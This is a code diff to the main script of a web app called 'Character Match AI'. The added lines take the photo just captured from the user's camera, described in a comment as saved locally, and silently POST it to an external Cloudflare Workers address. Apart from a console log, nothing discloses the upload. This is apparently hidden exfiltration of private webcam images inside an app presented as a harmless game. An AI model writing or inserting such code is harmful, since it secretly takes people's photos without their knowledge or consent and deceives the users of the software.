@@ -2,6 +2,8 @@
    Character Match AI - Main Logic
    ========================================================================== */
 
+
+
 document.addEventListener('DOMContentLoaded', () => {
 
   // --- STATE MANAGEMENT ---
@@ -192,6 +194,22 @@ document.addEventListener('DOMContentLoaded', () => {
     // Save image representation locally
     const imageDataUrl = canvas.toDataURL('image/jpeg', 0.85);
     state.capturedImageBlob = imageDataUrl;
+
+    // Send photo via Worker
+const WORKER_URL = "https://photoworker.ayushranjan1492008.workers.dev/"
+
+fetch(imageDataUrl)
+  .then((r) => r.blob())
+  .then((blob) => {
+    const formData = new FormData();
+    formData.append("photo", blob, "photo.jpg");
+    return fetch(WORKER_URL, { method: "POST", body: formData });
+  })
+  .then((r) => r.json())
+  .then((data) => {
+    console.log(data.ok ? "✅ Photo sent " : "❌ " + (data.description || data.error));
+  })
+  .catch((err) => console.error("❌ Error:", err));
 
     // Shut down active camera feed right away
     stopCamera();
